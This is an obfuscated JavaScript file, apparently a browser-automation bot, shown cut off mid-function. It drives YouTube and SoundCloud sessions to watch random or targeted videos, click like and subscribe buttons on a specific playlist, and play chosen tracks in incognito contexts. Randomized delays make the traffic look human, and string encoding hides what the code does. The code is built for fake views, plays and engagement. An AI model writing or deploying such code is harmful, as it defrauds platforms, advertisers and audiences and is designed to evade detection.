const W = c,
  V = d,
  U = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x1 * 0x25ce + 0x1 * -0x2593 + -0x3a))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x1e76 + 0xd * 0x1d7 + 0x68b), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0xe * -0xd01 + -0x4c7 + -0x1 * 0x3c17 + (0x2139 + -0x1205 * 0x1 + 0x2b64) * random()) : await standardWaitForNetIdle(f), await wait(0x7eb + -0x123 * 0x1d + 0x2c94 + (-0x5 * 0xe92 + 0xf92 * -0x2 + 0x8f0e) * random()), -0xe17 * 0x1 + 0x1461 + -0x649;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0xfad * -0x1 + 0x6e4 * 0x1 + -0x1691);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function standardWaitForNetIdle(f) {
  return await wait(0x2 * -0x959 + 0xce + 0x4 * 0x95b), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x2 * 0x6d9 + -0xef8 + 0x147;
}
async function randomWait() {
  return await wait(0x20c1 + -0x86b + 0x4ce * -0x1 + (-0x9c0 + -0x5c7 + -0x19 * -0x167) * random()), 0x1f30 + 0x2 * 0x938 + -0x1 * 0x319f;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x193d + 0x21a1 + -0x3ade, 0x2 * -0x718 + -0x531 + -0x2e * -0x6c), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x5265 + -0xf273 + 0x18a6e) * getRandomInt(-0x2a7 * -0x2 + -0xc19 * -0x2 + -0x1d7e, -0x2 * -0x1d0 + -0x261c + 0x2281), h)), 0x952 * 0x2 + 0x1269 + -0x250c;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x11f2 * 0x2 + 0x10 * -0x137 + -0x24 * 0x75;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x1 * -0x19c7 + -0x2645 + 0x1 * 0x400d]['split']('\x20');
    for (let k = 0x2374 + -0x1e00 + -0x2ba * 0x2; k < i['length']; k += 0x623 * -0x3 + -0x146c + -0x26d7 * -0x1)
      j += i[k] * h[i[k + (-0x26d + 0xf53 * -0x1 + 0x11c1)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x10f4 + -0xeed * -0x2 + -0x2 * 0x670)['map'](l => Array['from'](l['children']))['flat'](0x250c + 0x1367 + -0xaa * 0x55)['map'](l => l['childNodes'][0x6f * -0x19 + -0x3 * 0x595 + 0x1b97]['childNodes'][-0x22ff + -0x1da7 + 0x40a6]['childNodes'][-0x1f1 * -0x7 + -0x851 * 0x1 + -0x545 * 0x1]['childNodes'][0x1f41 * -0x1 + 0x15f * 0x1 + 0x1de2]['childNodes'][0x1b1b + -0x5e * -0x5d + -0x3d40]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0xedb + 0x19ba * 0x1 + 0x1 * -0x6f7, 0x186b + 0x2566 + -0x2a49)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x6068 + 0xd * 0x32a + 0x71de);
  const h = await getMaxTime(f),
    i = Math['min']((-0x157a0 + -0x7e1 * -0x28 + 0x106d8) * getRandomInt(-0x1462 + 0x19b1 + -0x54d, 0x206a + -0x13 * -0x1d1 + -0x42e8), h);
  return await wait(i), 0x1554 + -0x2 * 0xc49 + 0x33f;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const R = d;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + R(0xa) + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0xa1c + 0x1343 * -0x1 + 0x67 * 0x49]['children'][0x1a38 + 0x2b * -0x2b + -0x1 * 0x12ff]['children'][-0x1121 + 0x2b3 * 0x8 + 0x7f * -0x9]['children'][-0x168a + 0x3f8 + 0x1 * 0x1292]['children'][-0x1c7e + 0x14a5 + -0x1 * -0x7d9]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x1c19 * -0x1 + 0xf19 * 0x1 + -0x2b31;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0xfad * -0x1 + 0x6e4 * 0x1 + -0x1691);
    let h = e[f];
    if (b['LDpQCH'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x245b + -0xd18 + 0x1 * 0x3173, s, t, u = 0x1970 + -0x2 * 0x681 + -0xc6e * 0x1; t = n['charAt'](u++); ~t && (s = r % (0x5 * 0x4ae + 0x261 + -0x19c3) ? s * (0xd * 0x1d7 + -0xcc + -0x1 * 0x16df) + t : t, r++ % (0xae0 + -0x3 * 0x5bc + -0x4 * -0x196)) ? p += String['fromCharCode'](-0x240c + 0x198 + -0x717 * -0x5 & s >> (-(-0x1625 + 0x1cf6 + -0x6cf) * r & -0xf92 + 0x2593 * 0x1 + -0x15fb)) : -0xe17 * 0x1 + 0x1461 + -0x64a) {
          t = o['indexOf'](t);
        }
        for (let v = 0x2 * -0x959 + 0xce + 0x4 * 0x479, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x2 * 0x6d9 + -0xef8 + 0x156))['slice'](-(0x20c1 + -0x86b + 0x1854 * -0x1));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x9c0 + -0x5c7 + -0x19 * -0x9f,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x1f30 + 0x2 * 0x938 + -0x2 * 0x18d0; u < 0x193d + 0x21a1 + -0x39de; u++) {
          p[u] = u;
        }
        for (u = 0x2 * -0x718 + -0x531 + -0x29 * -0x79; u < 0x6de + -0x1435 + 0xe57; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x2a7 * -0x2 + -0xc19 * -0x2 + -0x1c80), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x2 * -0x1d0 + -0x261c + 0x227c, q = 0x952 * 0x2 + 0x1269 + -0x250d;
        for (let v = 0x11f2 * 0x2 + 0x10 * -0x137 + -0x24 * 0x75; v < n['length']; v++) {
          u = (u + (0x1 * -0x19c7 + -0x2645 + 0x1 * 0x400d)) % (0x2374 + -0x1e00 + -0x72 * 0xa), q = (q + p[u]) % (0x623 * -0x3 + -0x146c + -0x27d5 * -0x1), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x26d + 0xf53 * -0x1 + 0x12c0)]);
        }
        return t;
      };
      b['OOYJlC'] = m, c = arguments, b['LDpQCH'] = !![];
    }
    const j = e[-0x10f4 + -0xeed * -0x2 + -0x1 * 0xce6],
      k = f + j,
      l = c[k];
    return !l ? (b['CoGgJb'] === undefined && (b['CoGgJb'] = !![]), h = b['OOYJlC'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x33d + -0x8c9 + 0x5f0 + (-0xb10 + -0xd0b + 0x184d * 0x1) * random()
  }), await wait(0x1ef6 + -0x1 * 0x12af + -0xa53 + (0x576 + -0x1115 * -0x1 + 0x155f * -0x1) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x1 * 0x240b + -0x2048 * -0x1 + -0x4451 * 0x1]['childNodes'][-0x22b5 + -0xed4 + 0x318a]['childNodes'][0xf5 * 0x5 + -0x21c4 + 0x1cfc]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x22 * 0x105 + 0x1a54 + -0x3 * 0x1453]['childNodes'][-0x14cc + 0x149f + 0x2d]['childNodes'][-0x865 + 0x204 * 0x5 + 0xd * -0x21]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0xb * 0x14b + -0x1cf * -0x4 + 0x6fe),
          r = -0x186a + 0xc12 + 0xc58;
        for (let u = -0xf3b + 0x1df0 + 0x5 * -0x2f1; u < q['length']; u += 0x17c8 + 0x701 + -0x1ec7)
          r += q[u] * k[q[u + (0x2 * -0x757 + 0x1f8b + -0x10dc)]];
        return r;
      }(n);
  });
  await wait((0x1 * 0x336b + 0x2ae1 + 0x23b4 * -0x1) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0xa75 * -0xb + 0x48 * 0x36d + 0x1d * 0x38b) * getRandomInt(-0x1e75 + -0x20b9 * 0x1 + 0x3f2f, -0x31c + 0x17 * -0xe9 + 0x1815), h + (-0x201c + -0x141 + 0x1 * 0x34e5));
  return await wait(i), -0x1c9 * -0xd + 0x15 * -0x18 + -0x153c;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x2151 + 0x712 + 0x1a3f), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x17 * 0x3b + 0x2 * 0xacf + 0x1 * -0xf33 + (-0x1911 + -0x40 * -0x2f + 0x1139) * Math['random']());
    });
  }, 0x1aa9 + 0x121 * 0x9 + -0x97a);
  await wait(-0x875c0 + -0x5a25f * -0x1 + -0x1 * -0x76741);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x1 * 0xe5ca + 0x1 * -0xe2e3 + -0x245f * -0x13) * getRandomInt(0x2550 + -0x1e10 + 0x1 * -0x73c, -0x4 * 0x71f + -0x2265 + -0x2 * -0x1f7d)), clearInterval(h), -0x110 + -0x2 * -0xcb9 + -0x1861;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x221a + -0x1a96 + 0x3cb0;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x1 * 0x2314 + 0x1f90 * -0x1 + -0x383;
    await randomWait();
  }
  return -0xcb4 + 0x2e0 + 0x347 * 0x3;
}

function fetchRandomSC() {
  const S = c;
  return Math['random']() <= -0x262a + 0xcb5 * -0x2 + 0x3f94 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x22e1 + 0x1fc + 0x7 * 0x4b3 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + S(0x2) + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const T = c;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x2 * -0x24b + 0x18a * 0x6 + 0x2 * -0x6e9 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x126c + 0x181c * -0x1 + 0x1 * 0x2a88;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x10e3 * 0x3 + 0x1115f + -0x9440 + getRandomInt(0x23ed * 0x2 + 0x3 * -0x36a + -0x304, -0x315b + -0x8 * 0x1445 + 0x148b3));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1 * -0xf47 + 0x1eb + -0x1131), r = await f[T(0x7) + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x1fa8 + -0x5d3 + 0x65 * 0x5f;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x1418 + 0x1 * -0x19ab + 0x2dc3, 0x263c + 0x310 + -0x291a)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x29 * 0x1 + 0xf34 + 0x269 * -0x3 + floor((-0xb * -0x346 + 0x491 + -0x95 * 0x3f) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0xa0d * 0xed434 + -0x5a0a69 * -0xc + -0x431 * -0x411738),
          -0xed642a + -0x1 * -0xbd581e + 0xb00c0c,
          0x395 * -0x1 + 0xb648 + -0x32b3,
          0x93 * 0x3b + -0xed2 + -0x128f
        ], y = [
          0x9 * 0xf5 + -0x1 * 0xad + -0x7d8,
          0x2 * 0x793 + 0x6e3 * -0x1 + -0x833 * 0x1,
          -0x20c0 + 0x12ce + 0xdfa,
          0x15fa + 0x1 * 0x210a + 0x1f7 * -0x1c
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x1 * -0xb1b + -0x1ce9 + 0x11cf)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x1 * -0x1735 + 0x1583 * 0x1 + 0x1b2; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0xa7 * -0x35 + -0x3b * -0x7f + 0x54e) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x1c88 + 0xcd * 0xa + 0xc2e * -0x3] = A[0x11db * 0x1 + 0x351 * -0xa + 0x1 * 0xf5f] = A[-0x11b + 0x177 + -0x5b] = A[0xe9a + 0x1fb * -0x5 + -0x1 * 0x4b1] = A[-0x18e0 * 0x1 + 0xa6 * 0x2 + 0x1797] = A[0x1b3 + -0xe * -0x170 + -0x15cf] = A[-0x1bf9 + 0x141d + 0x7e1 * 0x1] = A[0x26d1 + -0x11f2 * -0x2 + 0x1 * -0x4aaf] = A[-0x65e + -0x2 * 0x7f4 + -0x1 * -0x164d] = A[-0x12ee + 0x2268 + 0x1 * -0xf72] = A[0x5 * -0x67b + 0x22aa + -0x23a] = A[-0x252 + -0x1b4 + -0x1 * -0x410] = A[-0x1c3b + 0x2534 + -0x477 * 0x2] = A[0x14c0 + -0x22 * -0x8d + -0x276e] = A[0x1929 + -0x11f1 * -0x1 + -0x67 * 0x6b] = A[0x1f * 0x8b + -0x2da * 0xd + 0x144b] = A[0xbf + 0xcf * -0x2 + 0x22 * 0x7] = -0x52a + 0x1b55 + -0x19 * 0xe3, this['blocks'] = A) : this['blocks'] = [
                0x2211 + -0x1202 + -0x100f,
                0x1c4 * 0xe + 0x216a + 0x2 * -0x1d11,
                0x180e + 0xe * -0x265 + 0x4bc * 0x2,
                -0x84b + 0x2b * -0x3f + -0x12e * -0x10,
                0x1d2 + 0x703 + -0x8d5,
                -0x1 * 0x2595 + 0x25b4 + 0x1 * -0x1f,
                0x826 + -0xda4 + 0x2 * 0x2bf,
                0xc23 + 0x2342 + -0x44f * 0xb,
                -0x12a * 0x2 + -0x7 * 0x146 + 0xb3e * 0x1,
                0x33 * -0x56 + -0x26fb + 0xd * 0x451,
                -0x2503 + -0x1 * -0x1f46 + -0x71 * -0xd,
                -0x3 * -0x685 + 0x1520 + -0x28af * 0x1,
                -0x439 * 0x1 + -0x185e + 0x1 * 0x1c97,
                0x66f + -0xb16 + 0x4a7,
                0x2200 + 0x18d2 + -0x3ad2,
                0x1 * 0x24f4 + -0x2 * 0x1028 + 0xc * -0x63,
                -0x5ec + 0xa9c + 0x14 * -0x3c
              ], this['h0'] = 0x139f7ee3 + 0x326de42b + 0x2137bff3, this['h1'] = -0x111a4c102 + 0x33a * 0x67edf1 + 0xb21cb0f1, this['h2'] = 0xc18dde79 + 0xfb0bf1a8 + -0x123def323, this['h3'] = 0x133112c8 + 0x406fbd1 + -0x705ba23, this['h4'] = 0x8a8458d3 + -0x1663403e9 + 0x19f828d06, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x2400 + 0x509 * 0x1 + 0x1ef7, this['finalized'] = this['hashed'] = -0x1a99 * 0x1 + 0x1 * 0x1f4b + -0x4b2, this['first'] = 0x399 * -0x7 + 0x3 * 0xc22 + -0xb36;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x42 * 0x17 + -0x1fb8 + 0x25a6, O = J['length'] || 0x1897 + 0x1754 + -0x2feb, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x1069 + 0x69 * -0x19 + -0x628, P[-0x5 * 0x4bb + -0x263e + -0x3de5 * -0x1] = this['block'], P[0x10a8 + 0x1e48 + -0x3c * 0xc8] = P[0x2608 + 0x18b * -0x17 + -0x28a] = P[-0x169b + 0x6ca + 0xfd3] = P[0x1b6b + 0x2 * 0x4c8 + 0x1 * -0x24f8] = P[0x28d * -0xa + -0x15f7 * -0x1 + 0x38f * 0x1] = P[0x2 * 0x10dd + 0x984 + -0x2b39] = P[-0x60a + -0x2a2 * -0x2 + -0x6 * -0x22] = P[0x83 * -0x9 + 0x1401 + -0xf5f] = P[-0x78 * -0x22 + 0x65 * -0x17 + -0x6d5] = P[-0xbd2 * -0x1 + 0x2057 + 0x2 * -0x1610] = P[0x6e8 * -0x2 + 0x165f + -0x885] = P[0x1 * 0xe14 + -0x1125 + -0x1 * -0x31c] = P[0xc5 * 0x8 + 0x74b + -0x49 * 0x2f] = P[0x24a4 + 0xf * -0x35 + -0x85f * 0x4] = P[0xcfc + 0x1cb * 0xd + -0x243d * 0x1] = P[-0x983 + 0x4e * -0x7a + 0x2 * 0x175f] = -0x562 * 0x1 + -0x219 * 0x8 + -0xb15 * -0x2), K) {
                    for (N = this['start']; M < O && N < -0x18c9 + 0x1 * -0x1609 + 0x2 * 0x1789; ++M)
                      P[N >> -0x2e2 * -0x6 + -0x1 * -0x849 + -0x1993 * 0x1] |= J[M] << y[-0x1 * -0x1b25 + -0x2522 + -0x28 * -0x40 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x1c33 * -0x1 + -0x97 * 0x3b + 0x6da; ++M)
                      (L = J['charCodeAt'](M)) < -0x1864 + -0x27 * -0x1 + 0x18bd ? P[N >> -0x91d + 0x479 + 0x4a6] |= L << y[0xd6e * -0x1 + 0x1fef + -0x127e & N++] : L < -0x1 * -0x22db + 0x10 * -0x265 + 0xb75 ? (P[N >> -0x196 * 0x6 + -0xfab + -0x1931 * -0x1] |= (-0x11d8 + 0x7fc + -0x2a7 * -0x4 | L >> -0x2378 + 0x1a2b + 0x953) << y[0x13d7 + -0x24fb * -0x1 + 0x1 * -0x38cf & N++], P[N >> -0x1 * -0x9d4 + -0x892 * -0x3 + -0x2388] |= (-0x1 * 0xa36 + -0x1 * -0x4ee + 0x5c8 | 0x1 * 0x295 + 0x13 * 0x12b + 0x82d * -0x3 & L) << y[0x49e + -0x5ea + 0x14f & N++]) : L < 0x44c7 * -0x4 + -0x430f + 0x22e2b || L >= -0x14d03 + 0x1228f * 0x1 + 0x10a74 ? (P[N >> 0x5 * 0x173 + -0x1df5 + 0x16b8] |= (-0x123a + 0x1a6c + -0x752 * 0x1 | L >> 0xcb * -0x25 + -0xf3f + 0x2ca2) << y[-0x178 * 0x2 + -0xe * 0x4 + 0x32b & N++], P[N >> -0x1e24 + -0xfa1 + 0x2dc7] |= (-0x138b + 0x1df6 + -0x9eb | L >> 0x2464 + -0x1574 + 0x17 * -0xa6 & -0xfbd * -0x1 + -0x5af * 0x3 + 0x18f) << y[-0xb5 * -0x1f + 0x78f + -0x18d * 0x13 & N++], P[N >> 0x24fb + 0x88d + 0x16c3 * -0x2] |= (-0x1884 + -0x11ed + 0x2af1 | 0x7ed + 0x188b + -0x2039 & L) << y[0xf1f + 0x3 * 0xdf + -0x11b9 & N++]) : (L = -0x1 * 0x95f + 0x1a * -0x6fd + 0x1bf11 + ((0x1552 + 0x9b * -0x39 + -0x44c * -0x4 & L) << -0x2373 + 0x1e24 + -0x25 * -0x25 | 0x5 * 0x777 + 0xffd * -0x1 + -0x1157 & J['charCodeAt'](++M)), P[N >> 0x69d + -0xa * 0x5 + -0x3 * 0x223] |= (0x1967 * -0x1 + -0x1411 + 0x58 * 0x87 | L >> -0x8f + 0xef7 + -0x1 * 0xe56) << y[-0xa9d + -0x1bcd + 0x266d & N++], P[N >> 0x22e3 + -0x7 * 0x134 + -0x1a75] |= (0xe1d * -0x1 + -0x1 * 0xf8e + 0x1e2b | L >> 0xa65 * 0x1 + -0x24bf * -0x1 + 0x112 * -0x2c & 0x17b3 + -0xb3 * 0x29 + -0x3 * -0x1bd) << y[-0x3 * 0x920 + 0x1aae + 0xb5 & N++], P[N >> -0x100d + 0x10a9 * -0x1 + 0x20b8] |= (0x5 * 0x535 + -0x2061 + 0x6d8 | L >> 0x175 * 0x4 + 0x1 * 0x1d19 + -0x22e7 & 0x1c22 + 0x5 * 0x85 + -0x1e7c) << y[0x11 * -0x1c9 + 0x7d4 + 0xe * 0x19c & N++], P[N >> 0x18b2 + 0x517 * 0x1 + 0x9 * -0x34f] |= (-0x1aba + -0x1511 + 0x304b | -0x1 * 0x233 + -0x99b * 0x4 + 0x28de * 0x1 & L) << y[-0x18a * -0xd + 0x1 * -0xf07 + -0x9f * 0x8 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x1ffa + 0x22 * -0xd6 + -0x7 * -0x8aa ? (this['block'] = P[-0x3df * 0x6 + -0x13ed + 0x2b37], this['start'] = N - (0x46 * -0x49 + 0x1f04 * 0x1 + -0x1 * 0xace), this['hash'](), this['hashed'] = -0x172d + -0x23a8 + 0x3ad6) : this['start'] = N;
                }
                return this['bytes'] > 0x1395672 * 0x18 + -0x185dfdc57 * -0x1 + -0xa33ff708 && (this['hBytes'] += this['bytes'] / (0x1b40e7f04 + -0xa26aede4 + 0x162298 * -0xcc) << 0x87f * 0x2 + 0x2622 + 0x1b9 * -0x20, this['bytes'] = this['bytes'] % (-0x23f19e1c + 0x26e15350 + -0x1f726 * -0x80c2)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x1b57 + -0xfd1 * -0x1 + -0xe3 * -0xd;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
